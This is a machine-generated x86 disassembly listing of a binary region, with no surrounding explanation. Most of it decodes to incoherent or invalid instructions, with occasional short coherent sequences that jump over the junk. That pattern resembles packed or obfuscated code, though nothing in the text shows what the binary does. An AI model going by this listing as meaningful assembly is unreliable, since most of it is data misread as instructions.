  402956:	idiv   DWORD PTR [ecx+0x290609c9]
  40295c:	or     BYTE PTR [ecx+0x35],dl
  40295f:	cmc    
  402960:	pop    eax
  402961:	inc    DWORD PTR [eax-0x6e]
  402964:	dec    eax
  402965:	push   0xffffffe3
  402967:	loopne 0x402969
  402969:	addr16 dec ebx
  40296b:	and    ecx,DWORD PTR [edx+0x69]
  40296e:	adc    esp,esp
  402970:	retf   0x8870
  402973:	imul   ecx,DWORD PTR es:[bx+si-0x791f],0xfc3078f8
  40297d:	in     al,dx
  40297e:	push   cs
  40297f:	int3   
  402980:	jb     0x402936
  402982:	adc    eax,0x38396ca1
  402987:	test   al,0xa
  402989:	sbb    bl,cl
  40298b:	ret    0x7554
  40298e:	aaa    
  40298f:	pop    ebx
  402990:	mov    BYTE PTR [esi+0x6],ah
  402993:	ret    0xa18f
  402996:	adc    cl,ch
  402998:	ror    eax,1
  40299a:	and    bh,al
  40299c:	mov    WORD PTR [eax+0x2d],ss
  40299f:	push   edi
  4029a0:	ins    DWORD PTR es:[edi],dx
  4029a1:	pop    edi
  4029a2:	or     bh,dl
  4029a4:	les    eax,FWORD PTR [ebx-0x3c]
  4029a7:	loop   0x402971
  4029a9:	imul   edx,DWORD PTR [edi-0x4],0x5482d1b1
  4029b0:	jge    0x402963
  4029b2:	jo     0x4029ab
  4029b4:	mov    cl,0x3f
  4029b6:	sbb    BYTE PTR [ebp+0x24],bl
  4029b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029ba:	fist   DWORD PTR [ebx+0x587c637a]
  4029c0:	xchg   esp,eax
  4029c1:	add    ebx,DWORD PTR [eax-0x6bd33f5e]
  4029c7:	sbb    al,0xbd
  4029c9:	mov    ds:0xb68b8609,al
  4029ce:	out    0x77,al
  4029d0:	jmp    0xbb4f:0x7e37a487
  4029d7:	ins    DWORD PTR es:[edi],dx
  4029d8:	cmp    bh,BYTE PTR [ecx-0x43]
  4029db:	cwde   
  4029dc:	xor    esi,DWORD PTR [esi+0x6bc2eec1]
  4029e2:	jae    0x4029ce
  4029e4:	xchg   esi,eax
  4029e5:	shl    edx,0xb0
  4029e8:	dec    esi
  4029e9:	pop    ebx
  4029ea:	jae    0x4029e8
  4029ec:	call   0x8899c148
  4029f1:	stos   BYTE PTR es:[edi],al
  4029f2:	add    al,0xad
  4029f4:	push   es
  4029f5:	sbb    bh,dh
  4029f7:	in     al,dx
  4029f8:	loop   0x402a3c
  4029fa:	bound  eax,QWORD PTR [edx-0x10]
  4029fd:	jbe    0x402a19
  4029ff:	mov    DWORD PTR [eax+0x63],ebx
  402a02:	shl    BYTE PTR [edi-0x44a311cf],cl
  402a08:	ffreep st(6)
  402a0a:	xchg   ebp,eax
  402a0b:	scas   al,BYTE PTR es:[edi]
  402a0c:	cld    
  402a0d:	jno    0x4029e9
  402a0f:	cdq    
  402a10:	inc    esi
  402a11:	xchg   esi,eax
  402a12:	push   edx
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	call   0x7e0d:0xaa460f2b
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402ab4
  402a41:	adc    ecx,DWORD PTR [ebx+0x27ee9fbd]
  402a47:	mov    ebx,0x4114a3e2
  402a4c:	lds    ecx,FWORD PTR [edi-0xa]
  402a4f:	or     BYTE PTR [edi+0x32],al
  402a52:	pop    ebp
  402a53:	neg    DWORD PTR [ebx+0x17df8b69]
  402a59:	imul   esp,DWORD PTR [esi+0x29],0x58
  402a5d:	mov    dh,0xe3
  402a5f:	test   al,0xed
  402a61:	jno    0x402a14
  402a63:	cmp    BYTE PTR [ebx+0x1c],dh
  402a66:	fiadd  DWORD PTR [esi+0x505f0bf6]
  402a6c:	dec    edi
  402a6d:	sahf   
  402a6e:	inc    ebx
  402a6f:	repz fnsave [edi]
  402a72:	ja     0x402a7e
  402a74:	add    eax,0xb1e03dc2
  402a79:	xchg   ebp,eax
  402a7a:	fimul  DWORD PTR [edi+edi*8+0x2b]
  402a7e:	pop    esp
  402a7f:	fsub   DWORD PTR [edi+0x62]
  402a82:	sti    
  402a83:	cld    
  402a84:	dec    ebx
  402a85:	sub    eax,0x6d159b1
  402a8a:	shl    BYTE PTR [ebp+0x13],1
  402a8d:	jo     0x402ae6
  402a8f:	push   esi
  402a90:	test   al,0x46
  402a92:	or     bl,bl
  402a94:	sub    BYTE PTR [edi+eiz*2+0x16],0x6f
  402a99:	push   bx
  402a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a9c:	xchg   esi,eax
  402a9d:	shr    DWORD PTR [esi+0x4d],0xe9
  402aa1:	(bad)  
  402aa2:	and    dl,BYTE PTR [ebx-0x75157153]
  402aa8:	inc    bh
  402aaa:	adc    eax,0x51aa4687
  402aaf:	imul   edx,DWORD PTR [ebx-0x3276b185],0x6b
  402ab6:	add    eax,0x84fdf299
  402abb:	push   es
  402abc:	mov    DWORD PTR [esi],ebp
  402abe:	mov    DWORD PTR ds:0x60a28b53,ebp
  402ac4:	scas   al,BYTE PTR es:[edi]
  402ac5:	sar    edi,0x96
  402ac8:	xor    BYTE PTR [ecx+0x193ed2d2],ch
  402ace:	sti    
  402acf:	adc    DWORD PTR ds:0xd69f93d3,eax
  402ad5:	dec    esp
  402ad6:	aam    0x7a
  402ad8:	loopne 0x402ae7
  402ada:	cmp    ebx,DWORD PTR [ecx-0x66bd3e13]
  402ae0:	jb     0x402b3c
  402ae2:	adc    al,0xf7
  402ae5:	fwait
  402ae6:	or     al,0x31
  402ae9:	les    ebx,FWORD PTR [ecx-0x63be045d]
  402aef:	mov    ah,0xe8
  402af1:	test   BYTE PTR [eax],bl
  402af3:	fsubr  DWORD PTR [edi-0x15]
  402af6:	icebp  
  402af7:	mov    eax,0xd4e18ad0
  402afc:	(bad)  
  402afd:	mov    ds:0x893fa9b5,al
  402b02:	fcomp  QWORD PTR [ebp-0x7d]
  402b05:	(bad)  
  402b06:	repz cmp al,0x76
  402b09:	out    0xbf,al
  402b0b:	dec    ecx
  402b0c:	aad    0x23
  402b0e:	inc    ebx
  402b0f:	les    ebx,FWORD PTR ss:[ebx]
  402b12:	mov    al,ds:0xd0c9e387
  402b17:	add    eax,0x2ececb4c
  402b1c:	mov    ah,0x1f
  402b1e:	shl    BYTE PTR [ebx-0x1b],0x5a
  402b22:	jmp    FWORD PTR [eax-0x3b]
  402b25:	xchg   DWORD PTR [ecx],edi
  402b27:	les    ecx,FWORD PTR [ecx]
  402b29:	pop    ds
  402b2a:	inc    eax
  402b2b:	xor    dl,BYTE PTR [edx-0x12]
  402b2e:	ficom  WORD PTR ds:0x7bac53e0
  402b34:	ins    BYTE PTR es:[edi],dx
  402b35:	sbb    eax,0x96942d53
  402b3a:	inc    eax
  402b3b:	ins    DWORD PTR es:[edi],dx
  402b3c:	cmp    DWORD PTR [esi],ebx
  402b3e:	daa    
  402b3f:	scas   eax,DWORD PTR es:[edi]
  402b40:	fstp   QWORD PTR ds:0xc853aa5
  402b46:	mov    edx,0x2c88a713
  402b4b:	into   
  402b4c:	repnz popa 
  402b4e:	(bad)  
  402b4f:	mov    bh,0xe7
  402b51:	lea    esi,[ecx]
  402b53:	aam    0x99
  402b55:	mov    ebp,0x3801a00d
  402b5a:	jl     0x402bb2
  402b5c:	jno    0x402bd1
  402b5e:	outs   dx,DWORD PTR ds:[esi]
  402b5f:	push   es
  402b60:	lea    edx,[ecx+0x69]
  402b63:	dec    ecx
  402b64:	test   al,ah
  402b66:	push   ds
  402b67:	xchg   BYTE PTR [ebp+0x2cd693b1],bh
  402b6d:	(bad)  
  402b6e:	bound  ecx,QWORD PTR [edx+edi*8-0x4b513fb2]
  402b75:	jp     0x402b31
  402b77:	outs   dx,BYTE PTR ds:[esi]
  402b78:	xchg   ebp,eax
  402b79:	je     0x402b40
  402b7b:	inc    eax
  402b7c:	sub    al,0x3c
  402b7e:	push   0x5
  402b80:	enter  0xe899,0x79
  402b84:	add    BYTE PTR [ebp-0x5e],cl
  402b87:	inc    DWORD PTR [ebx+esi*8-0x56]
  402b8b:	ins    BYTE PTR es:[edi],dx
  402b8c:	inc    esp
  402b8d:	dec    esi
  402b8e:	hlt    
  402b8f:	mov    ebp,DWORD PTR [eax]
  402b91:	inc    edx
  402b92:	mov    ah,ah
  402b94:	mov    ds:0xf4960234,al
  402b99:	int    0x8f
  402b9b:	lods   al,BYTE PTR ds:[esi]
  402b9c:	pop    es
  402b9d:	mov    ebx,0x470ecdbf
  402ba2:	dec    esp
  402ba3:	add    DWORD PTR [eax+ebx*4-0x5dd135ee],edi
  402baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bab:	adc    dl,BYTE PTR [ecx-0x3d03c0d6]
  402bb1:	push   ebx
  402bb2:	inc    edx
  402bb3:	stc    
  402bb4:	es retf 0x2ba
  402bb8:	std    
  402bb9:	sub    edx,DWORD PTR [ebx+edx*2-0x34]
  402bbd:	or     dl,dh
  402bbf:	xor    BYTE PTR [ebp-0x9],cl
  402bc2:	pop    ds
  402bc3:	adc    al,BYTE PTR [ebp+0x28840fc0]
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	adc    esp,DWORD PTR [ebp-0x6b]
  402c14:	inc    eax
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c67
  402c1e:	aaa    
  402c1f:	fs push cs
  402c21:	or     al,0x67
  402c23:	jp     0x402bf8
  402c25:	sub    esi,esi
  402c27:	repz or al,0x5a
  402c2a:	(bad)  
  402c2b:	imul   ebp,DWORD PTR [eax],0x3f
  402c2e:	mov    bh,dl
  402c30:	push   ebp
  402c31:	jmp    0x294c90e8
  402c36:	(bad)  
  402c37:	cli    
  402c38:	adc    al,0x54
  402c3a:	in     al,0x36
  402c3c:	sahf   
  402c3d:	sub    BYTE PTR [edi+0x2350f0e3],al
  402c43:	jae    0x402c57
  402c45:	test   BYTE PTR [edi+eiz*1],ah
  402c48:	lds    eax,FWORD PTR [esi]
  402c4a:	sub    al,dl
  402c4c:	or     DWORD PTR [eax],0x3a
  402c4f:	adc    dl,BYTE PTR [edi-0xa6dcf2b]
  402c55:	fld    TBYTE PTR [ecx+0x342a5a61]
  402c5b:	mov    al,0x82
  402c5d:	leave  
  402c5e:	lea    esp,[ebp+0x4e89dd17]
  402c64:	je     0x402caa
  402c66:	dec    esp
  402c67:	sti    
  402c68:	das    
  402c69:	xor    dh,cl
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	pushf  
  402c6d:	adc    cl,cl
  402c6f:	(bad)  
  402c70:	sbb    al,0x9a
  402c72:	cmp    DWORD PTR [ecx-0x16],0xfffffffe
  402c76:	mov    ebp,0xe9d7ee92
  402c7b:	cmp    al,0x6c
  402c7d:	mov    al,ds:0xa8b7cd1
  402c82:	xchg   esi,eax
  402c83:	sbb    eax,0x62644be5
  402c88:	jae    0x402c38
  402c8a:	push   esp
  402c8b:	mov    WORD PTR [esp+eiz*8-0x1a],gs
  402c8f:	fmul   DWORD PTR [ebx-0x7]
  402c92:	das    
  402c93:	leave  
  402c94:	popa   
  402c95:	clc    
  402c96:	cli    
  402c97:	fild   QWORD PTR [esi]
  402c99:	cmp    BYTE PTR ds:0x34253322,0x8d
  402ca0:	xor    BYTE PTR [edx-0x66c980a3],0xa6
  402ca7:	je     0x402c55
  402ca9:	xor    edx,DWORD PTR [ebp+ecx*8-0x56]
  402cad:	push   ebx
  402cae:	cdq    
  402caf:	sub    al,0x17
  402cb1:	(bad)  [ecx+ebx*8+0x24]
  402cb5:	mov    DWORD PTR [ecx-0x450f68f4],ebx
  402cbb:	mov    ds:0x812b7ddc,eax
  402cc0:	add    ch,BYTE PTR ds:0x8da86009
  402cc6:	pop    ebx
  402cc7:	std    
  402cc8:	jle    0x402c85
  402cca:	lahf   
  402ccb:	sub    al,0x6
  402ccd:	pop    ebp
  402cce:	stc    
  402ccf:	scas   eax,DWORD PTR es:[edi]
  402cd0:	or     DWORD PTR [esi-0x54],eax
  402cd3:	sbb    ebp,DWORD PTR [esi]
  402cd5:	and    DWORD PTR ds:0x6eb11396,edi
  402cdb:	ss jl  0x402cb9
  402cde:	loop   0x402ca1
  402ce0:	inc    ebx
  402ce1:	sub    eax,0x86335af3
  402ce7:	mov    edx,0xde58552a
  402cec:	iret   
  402ced:	shl    DWORD PTR [edi],0xa6
  402cf0:	test   eax,0x1ff3e2f2
  402cf5:	sahf   
  402cf6:	mov    eax,ds:0x5f081922
  402cfb:	dec    ebx
  402cfc:	pop    edi
  402cfd:	cmp    edi,eax
  402cff:	or     al,al
  402d01:	and    bh,BYTE PTR [ebp-0x6dea97c9]
  402d07:	xchg   esi,eax
  402d08:	repz xlat BYTE PTR ds:[ebx]
  402d0a:	ret    
  402d0b:	test   DWORD PTR [eax-0x6e5f73ee],esi
  402d11:	ret    0x949
  402d14:	mov    ebx,0x890ee632
  402d19:	sbb    eax,0x1e8b243a
  402d1e:	jecxz  0x402d0b
  402d20:	outs   dx,BYTE PTR ds:[esi]
  402d21:	jle    0x402d37
  402d23:	mov    eax,ds:0xb42882d2
  402d28:	fsub   DWORD PTR [edx]
  402d2a:	out    0x87,eax
  402d2c:	dec    esi
  402d2d:	pushf  
  402d2e:	add    al,0xb9
  402d30:	xchg   esp,esi
  402d32:	sbb    eax,0xdeee821b
  402d37:	jmp    0x402cf0
  402d39:	ror    BYTE PTR [ebx+0x13],0xec
  402d3d:	ret    
  402d3e:	adc    DWORD PTR [edx+eax*1+0x6111ab42],esp
  402d45:	cmp    bh,BYTE PTR [edx-0x7e]
  402d48:	fwait
  402d49:	pop    esi
  402d4a:	jmp    0x402d22
  402d4c:	sbb    eax,DWORD PTR [esi+ecx*2-0x2d7eb897]
  402d53:	and    al,0x75
  402d55:	lds    eax,FWORD PTR ds:0xb798cb00
  402d5b:	jmp    0xd176:0xf76c3678
  402d62:	cmc    
  402d63:	sbb    eax,0x3fe0f266
  402d68:	out    dx,eax
  402d69:	cdq    
  402d6a:	test   DWORD PTR [ebp+0x65],eax
  402d6d:	mov    ds:0xb60f26b7,eax
  402d72:	retf   0x42ef
  402d75:	or     al,BYTE PTR ss:[ebp-0x65]
  402d79:	add    dh,BYTE PTR [esi+eax*4]
  402d7c:	and    al,0x76
  402d7e:	mov    ds:0x918161ec,al
  402d83:	sbb    al,0xb2
  402d85:	scas   eax,DWORD PTR es:[edi]
  402d86:	pop    ebx
  402d87:	cdq    
  402d88:	add    al,0xe1
  402d8a:	int3   
  402d8b:	dec    esi
  402d8c:	ret    
  402d8d:	mov    cl,0xa
  402d8f:	js     0x402d6a
  402d91:	int3   
  402d92:	scas   al,BYTE PTR es:[edi]
  402d93:	add    BYTE PTR [eax-0x301dfa62],bl
  402d99:	dec    edi
  402d9a:	inc    edi
  402d9b:	addr16 pop ds
  402d9d:	jo     0x402d97
  402d9f:	imul   ebx,edx,0x8bfc452b
  402da5:	dec    ebp
  402da6:	mov    eax,0x458bc803
  402dab:	cld    
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ecx+ebp*2+0x67],1
  402de7:	std    
  402de8:	sub    dh,BYTE PTR [edx-0x58181f8]
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e6a
  402df2:	bnd ret 0x51f3
  402df6:	and    al,0xd8
  402df8:	ss cmp edi,eax
  402dfb:	pusha  
  402dfc:	ins    DWORD PTR es:[edi],dx
  402dfd:	fadd   QWORD PTR [edx+ebp*2-0x22]
  402e01:	out    0xa1,al
  402e03:	cmc    
  402e04:	gs jmp 0x2bb2:0xd6744a73
  402e0c:	and    eax,0x1ce1e165
  402e11:	loope  0x402dc3
  402e13:	pop    esp
  402e14:	movaps XMMWORD PTR [eax+edi*2-0x10],xmm3
  402e19:	rcr    DWORD PTR [esi],cl
  402e1b:	push   ss
  402e1c:	sub    DWORD PTR [edi],0x12
  402e1f:	fcomp  QWORD PTR [ebx]
  402e21:	mov    esi,0xe1f86b2b
  402e26:	add    ebx,edx
  402e28:	fcom   st(6)
  402e2a:	jg     0x402e8c
  402e2c:	push   eax
  402e2d:	jmp    0xe1e6:0x8bb5b551
  402e34:	fisttp QWORD PTR [edi-0x646efdce]
  402e3a:	sar    DWORD PTR [esi-0x22],cl
  402e3d:	push   esi
  402e3e:	out    0x5b,eax
  402e40:	loop   0x402eb2
  402e42:	lahf   
  402e43:	or     BYTE PTR [esi-0x7b4d8a5c],dl
  402e49:	xchg   edi,eax
  402e4a:	ins    DWORD PTR es:[edi],dx
  402e4b:	mov    DWORD PTR [ebp-0x5c211dc6],ebx
  402e51:	mov    edx,0x1ed7077e
  402e56:	pusha  
  402e57:	arpl   WORD PTR [esi-0x962ea58],ax
  402e5d:	mov    bh,0x63
  402e5f:	inc    esp
  402e60:	mov    eax,ds:0x2ad74691
  402e65:	pop    ebp
  402e66:	es push edx
  402e68:	sub    bh,cl
  402e6a:	adc    BYTE PTR [edx-0x171228ee],bl
  402e70:	xor    al,0xec
  402e72:	and    eax,0x3acc6f6
  402e77:	pop    es
  402e78:	jge    0x402e5c
  402e7a:	aaa    
  402e7b:	fld    DWORD PTR [ebp+0x1f114dd1]
  402e81:	xchg   ebp,edi
  402e83:	arpl   WORD PTR ds:0x1f0cc194,bp
  402e89:	test   DWORD PTR [ecx-0x28],ebx
  402e8c:	clc    
  402e8d:	inc    edx
  402e8e:	and    eax,0xb00cbce9
  402e93:	out    0xdd,al
  402e95:	jo     0x402ee6
  402e97:	pop    es
  402e98:	pusha  
  402e99:	adc    BYTE PTR [eax],al
  402e9b:	jle    0x402f0d
  402e9d:	scas   eax,DWORD PTR es:[edi]
  402e9e:	sub    al,0xec
  402ea0:	popa   
  402ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea2:	fistp  DWORD PTR [edi-0x1b2e0efe]
  402ea8:	lock xor esp,esi
  402eab:	hlt    
  402eac:	push   cs
  402ead:	pop    ebx
  402eae:	jp     0x402ee2
  402eb0:	lds    ebx,FWORD PTR [ecx+0x23]
  402eb3:	scas   al,BYTE PTR es:[edi]
  402eb4:	cmp    BYTE PTR [ebx],0x38
  402eb7:	in     eax,dx
  402eb8:	leave  
  402eb9:	or     eax,0xa2d41bf3
  402ebe:	mov    dl,0x95
  402ec0:	inc    eax
  402ec1:	fldenv [edi+0x20]
  402ec4:	daa    
  402ec5:	ins    DWORD PTR es:[edi],dx
  402ec6:	pop    ebp
  402ec7:	dec    edi
  402ec8:	push   esi
  402ec9:	mov    BYTE PTR ds:0x57a085d8,ah
  402ecf:	and    bl,BYTE PTR [edi+0x2a]
  402ed2:	fst    DWORD PTR [edx+0x42]
  402ed5:	imul   ecx,DWORD PTR [ebx],0x45
  402ed8:	xor    al,0x65
  402eda:	stos   DWORD PTR es:[edi],eax
  402edb:	(bad)  
  402edd:	adc    edx,eax
  402edf:	(bad)  
  402ee0:	out    0x10,al
  402ee2:	fisttp QWORD PTR ds:0xbe036b1
  402ee8:	leave  
  402ee9:	mov    eax,0x8d93867c
  402eee:	inc    ebx
  402eef:	out    0xf3,eax
  402ef1:	cli    
  402ef2:	and    eax,0xb1b5cc41
  402ef7:	sub    al,0x6
  402ef9:	ins    DWORD PTR es:[edi],dx
  402efa:	nop
  402efb:	pop    esi
  402efc:	and    al,0xa8
  402efe:	mov    DWORD PTR [ecx],ebp
  402f00:	enter  0x665c,0xe4
  402f04:	jmp    FWORD PTR [edx-0x56]
  402f07:	out    dx,eax
  402f08:	outs   dx,DWORD PTR ds:[esi]
  402f09:	sub    eax,0x59df71f8
  402f0e:	add    eax,0x557a0eef
  402f13:	and    dl,BYTE PTR [edi-0x233b88fd]
  402f19:	dec    esp
  402f1a:	jns    0x402f3b
  402f1c:	repz sbb esi,DWORD PTR [eax+0x2a]
  402f20:	out    0xc7,eax
  402f22:	fisub  DWORD PTR [ebx]
  402f24:	ret    
  402f25:	cld    
  402f26:	xchg   BYTE PTR [ecx+0x6667e1ec],bl
  402f2c:	and    eax,0xff6e6b00
  402f31:	js     0x402f56
  402f33:	shl    BYTE PTR [ebp+0x7],1
  402f36:	call   0x45ca901a
  402f3b:	pop    ebp
  402f3c:	inc    ebx
  402f3d:	inc    eax
  402f3e:	push   ebx
  402f3f:	ins    DWORD PTR es:[edi],dx
  402f40:	cmp    al,0x51
  402f42:	mov    dl,0x41
  402f44:	pop    ds
  402f45:	outs   dx,BYTE PTR ds:[esi]
  402f46:	mov    esp,DWORD PTR [ecx-0x71]
  402f49:	xchg   ebx,eax
  402f4a:	shr    bh,cl
  402f4c:	rol    DWORD PTR [ebx],cl
  402f4e:	(bad)  
  402f4f:	jae    0x402ed9
  402f51:	or     eax,0x8eb1c971
  402f56:	push   0x6d
  402f58:	dec    DWORD PTR [esi+0x54]
  402f5b:	aas    
  402f5c:	icebp  
  402f5d:	je     0x402fb6
  402f5f:	pop    ecx
  402f60:	mov    ss,ecx
  402f62:	data16 das 
  402f64:	pop    ebx
  402f65:	test   DWORD PTR [edi],edx
  402f67:	sets   BYTE PTR [edi-0x3f]
  402f6b:	xor    DWORD PTR [esi],0x2abfe15b
  402f71:	cmp    eax,0x8d2acef3
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x6f37a5b7]
  402fae:	adc    BYTE PTR [eax+0x3e],cl
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fc3
  402fb9:	push   ecx
  402fba:	imul   edi,DWORD PTR [ebp+0x69ba8538],0xffffffb1
  402fc1:	inc    esp
  402fc2:	rol    BYTE PTR [ebx-0x4a80162c],cl
  402fc8:	popa   
  402fc9:	scas   eax,DWORD PTR es:[edi]
  402fca:	and    al,BYTE PTR [esp+edi*2]
  402fcd:	cdq    
  402fce:	and    BYTE PTR [edx],bl
  402fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fd1:	xor    DWORD PTR [edx],0xffffffae
  402fd4:	sub    esi,DWORD PTR [esi]
  402fd6:	inc    edi
  402fd7:	jbe    0x403027
  402fd9:	retf   
  402fda:	sbb    al,0x70
  402fdc:	dec    ebx
  402fdd:	xchg   edi,eax
  402fde:	cmp    DWORD PTR [ebp-0x5c],esp
  402fe1:	mov    bl,0xe3
  402fe3:	rcr    DWORD PTR [edi+0x5b],1
  402fe6:	mov    al,ds:0x1740f482
  402feb:	or     eax,0xa97a6f3a
  402ff0:	repz push esi
  402ff2:	jne    0x402f96
  402ff4:	dec    eax
  402ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff6:	push   eax
  402ff7:	cmp    ebp,DWORD PTR [edx-0x22]
  402ffa:	push   ecx
  402ffb:	lea    ebp,[edx-0x6e]
  402ffe:	adc    DWORD PTR [edx*2+0x2a88ddc9],0x45
  403006:	xor    BYTE PTR [ebx],bh
  403008:	push   ecx
  403009:	pusha  
  40300a:	das    
  40300b:	or     cl,bh
  40300d:	xor    BYTE PTR [ebx-0x20],bh
  403010:	mov    al,ds:0x1409554c
  403015:	lods   eax,DWORD PTR ds:[esi]
  403016:	dec    BYTE PTR [eax]
  403018:	icebp  
  403019:	push   eax
  40301a:	pop    esp
  40301b:	(bad)  
  40301c:	(bad)  
  40301d:	mov    ds:0x66b1c1f4,eax
  403022:	sub    ebp,ecx
  403024:	pop    edx
  403025:	scas   al,BYTE PTR es:[edi]
  403026:	jge    0x402fc8
  403028:	daa    
  403029:	push   ds
  40302a:	cmc    
  40302b:	in     al,0x9d
  40302d:	jge    0x403063
  40302f:	ret    0x3589
  403032:	loopne 0x402fd1
  403034:	mov    esp,0x86577215
  403039:	cwde   
  40303a:	pop    esp
  40303b:	push   ss
  40303c:	repz icebp 
  40303e:	push   cs
  40303f:	mov    al,ds:0x944c05f5
  403044:	mov    dl,0xb1
  403046:	fwait
  403047:	or     ecx,DWORD PTR [edi]
  403049:	test   DWORD PTR [edi],ecx
  40304b:	loopne 0x403069
  40304d:	mov    ds:0x8e843125,eax
  403052:	test   al,0x6c
  403054:	mov    al,ds:0xb36730fc
  403059:	test   edi,0x9ea6c092
  40305f:	daa    
  403060:	cmc    
  403061:	and    ecx,DWORD PTR [edx-0x3c]
  403064:	jnp    0x402ffb
  403066:	in     eax,0x6a
  403068:	mov    edi,0xf2519d99
  40306d:	test   eax,0x70be7dec
  403072:	push   esi
  403073:	or     DWORD PTR [ecx-0x569d1160],edi
  403079:	mov    edi,DWORD PTR [edi-0x5b]
  40307c:	(bad)  
  40307d:	inc    esi
  40307e:	in     al,dx
  40307f:	mov    ebp,0x8355b03
  403084:	pop    eax
  403085:	xchg   BYTE PTR [ebp+0x8a045ba],dh
  40308b:	xor    DWORD PTR [edi+0x31885634],ebx
  403091:	push   ss
  403092:	int3   
  403093:	retf   
  403094:	aam    0xc5
  403096:	lods   eax,DWORD PTR ds:[esi]
  403097:	or     edx,DWORD PTR [edx+ebp*8]
  40309a:	scas   eax,DWORD PTR es:[edi]
  40309b:	mov    cl,0x72
  40309d:	mov    bl,0x9e
  40309f:	xchg   DWORD PTR [esi-0x70],esi
  4030a2:	test   DWORD PTR [esi+0x4a],esi
  4030a5:	sub    bl,al
  4030a7:	pusha  
  4030a8:	retf   0xf889
  4030ab:	mov    esi,0xf62b5de0
  4030b0:	(bad)  
  4030b1:	cmp    al,0x8b
  4030b3:	into   
  4030b4:	or     al,BYTE PTR [ebx]
  4030b6:	fmul   QWORD PTR [eax-0x4e]
  4030b9:	jmp    0x4030d8
  4030bb:	(bad)  
  4030bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030bd:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4030bf:	jg     0x4030d4
  4030c1:	js     0x40311f
  4030c3:	mov    esp,0xde023157
  4030c8:	inc    ebx
  4030c9:	xlat   BYTE PTR ds:[ebx]
  4030ca:	shr    bh,0x85
  4030cd:	dec    edx
  4030ce:	sub    BYTE PTR [ebx],bh
  4030d0:	icebp  
  4030d1:	sbb    edi,DWORD PTR [edi-0x2c93336c]
  4030d7:	(bad)  
  4030d8:	cs pop ecx
  4030da:	int    0xd9
  4030dc:	dec    esp
  4030dd:	cmp    al,0x37
  4030df:	out    dx,al
  4030e0:	jecxz  0x4030a3
  4030e2:	test   al,0xa9
  4030e4:	dec    eax
  4030e5:	f2xm1  
  4030e7:	test   DWORD PTR [ecx-0x484fbbda],esp
  4030ed:	add    eax,0x1cf7ada1
  4030f2:	mov    edi,0xcd046f90
  4030f7:	push   edi
  4030f8:	fdiv   QWORD PTR [eax]
  4030fa:	fninit 
  4030fc:	call   0x6b68:0xc19bddb3
  403103:	ins    BYTE PTR es:[edi],dx
  403104:	jl     0x403121
  403106:	inc    edi
  403107:	or     DWORD PTR [edx-0x1518b079],esp
